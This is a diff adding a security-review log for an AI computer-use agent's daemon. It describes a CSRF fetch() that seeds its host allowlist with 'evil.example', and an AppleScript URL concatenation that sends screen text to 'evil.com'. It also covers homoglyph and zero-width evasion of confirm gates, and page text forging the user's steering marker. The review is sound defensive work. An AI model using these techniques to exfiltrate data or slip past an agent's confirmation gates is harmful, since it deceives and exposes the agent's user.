@@ -2108,3 +2108,57 @@ steering (0bcb21d), polish (e8b5c43). What is non-obvious and worth keeping:
   to force a shared GUMBO_HOME. The smoke scripts (scratchpad) launch REAL headed Chrome
   via the worktree's client — re-run them on any Playwright/Chrome bump (probe.mjs is
   the aria-ref stability probe; treat a behavior change there as a breaking upgrade).
+
+### M7 review-address pass (2026-07-19, /review-2 on Fable — 1 debugger + 1 code-auditor — → /address)
+
+1 🔴 + 8 🟡 + 7 🔵 surfaced; all 🔴/🟡 fixed + 5 of 7 🔵 (daemon 345/1-skip, +16 tests; shell
+builds; live browser smoke re-verified incl. corrupt-state recovery). The 🔴 was genuine and
+on the new HTTP mutation surface — the review's real value, mirroring M6, was proving the gates
+are the entire security boundary:
+- **🔴 CSRF write to the exfil allowlist:** `POST /api/hosts` had no Origin check while the WS
+  hub right beside it does (`verifyClient`). A POST is a CORS *simple* request (no preflight), so
+  a hostile page the user has open could `fetch('http://127.0.0.1:8737/api/hosts', {method:'POST',
+  mode:'no-cors', body:'{"host":"evil.example"}'})` and silently seed the allowlist — then a later
+  computer task navigates/fetches evil.example with no notch confirm. Fixed by mirroring the hub's
+  Origin allowlist on the mutation branch (absent Origin = native shell → allowed), a 4 KB body cap,
+  and a shared `validHostEntry` (bare hostname WITH a dot — `{"host":"com"}` would otherwise
+  allowlist an entire TLD via the subdomain match). New `http.test.ts` (7 cases) covers it.
+- **🟡 URL-gate concatenation/indirection bypass (corroborated by both agents):** `extractFetchUrls`
+  split on *shell* separators, but the gate only runs on AppleScript, where `&` is string
+  concatenation — `open location "https://<allowed>" & "@evil.com/?d=<screen text>"` split so the
+  allowed anchor passed and the `@evil.com` fragment was skipped; executor opened
+  `https://<allowed>@evil.com/…` (userinfo@host = evil.com). Variable indirection (`set u to … &
+  secret` / `open location u`) and property-list nav (`{URL:…}`, `set URL of … to`) evaded the same
+  way. Fixed with `unresolvableNavTarget` (a nav verb whose target is a bare variable or a `&`
+  concatenation → confirm, the SHELL_EXPANSION stance the do-shell-script guard already takes) +
+  adding `url` to the fetchy-segment lexicon so property-list literals get host-checked. **Pinned
+  the OLD extractFetchUrls catches as regression tests BEFORE the rewrite** (the twice-proven M6
+  lesson) and added the new-catch tests; 24 policy tests green.
+- **🟡 "send/submit/purchase always confirms" was really "risky NAME or POST-form":** widened —
+  accessible names are NFKC+zero-width-normalized before the lexicon (kills fullwidth `Ｓｅｎｄ` and
+  `S​e​n​d` padding evasion), and a `select` change inside a POST form now confirms (onchange
+  submit). Honest residual DOCUMENTED in the comment: cross-script homoglyphs (Cyrillic `Ѕend`) and
+  a consequential JS `onclick` on an innocuously-named control OUTSIDE a `<form>` are the ceiling of
+  a name/form heuristic — the untrusted-screen-text rule + the model having no incentive to disguise
+  its own actions are the mitigation.
+- **🟡 forgeable STEERING sentinel:** `wrapSteering` now defangs any `STEERING FROM THE USER` occurrence
+  in the (untrusted) tool output BEFORE appending the real one — a page echoing the phrase can't forge
+  the user's voice (the structured-`no_change` spoof lesson applied to steering; a plain-text channel
+  can't be fully authenticated but the model never sees the marker except where the daemon put it).
+- **🟡 browser-client uncaught exception / corrupt state.json:** `requirePage()` threw *outside* the
+  try in snapshot/act/back → whole task hard-failed; `open()` now guarantees a live page (adopt a
+  surviving tab, else a blank one) so the model gets a snapshot to navigate from, and a truncated
+  `state.json` self-heals (delete + fresh context) instead of wedging every future task. captureState
+  is temp-then-rename (atomic) as the belt to that.
+- **🟡 region-capture display divergence (Swift):** the display was resolved twice with divergent
+  fallbacks, so a straddling/off-screen region captured the whole fallback display while OCR math
+  assumed the region → every coordinate wrong. Resolved once, reused for filter AND sourceRect.
+- **🟡 handoff finally flicker + 🔵s:** abort-guard on the handoff status-restore (no spurious
+  running→cancelled flicker); `wrapSteering` forwards all SDK args; `settleAndDiff` reports an
+  unsettled page instead of diffing against empty (whole-page-"removed" artifact); `switch_tab`
+  audits with its landed URL; `screen_look` `capture_denied` test; `~/Gumbo/logs` added to the
+  Claude-session `readDenied` (audit URLs can carry query-string tokens).
+- **Deliberately deferred:** 🔵 the two lanes' repetition/stall/`present()` guards are near-identical
+  copies — a shared helper is the right call, but extracting it across two working lanes right before
+  the live demos, with the "precision refactor regresses" lesson fresh, is a separate change. Recorded
+  so it isn't lost.
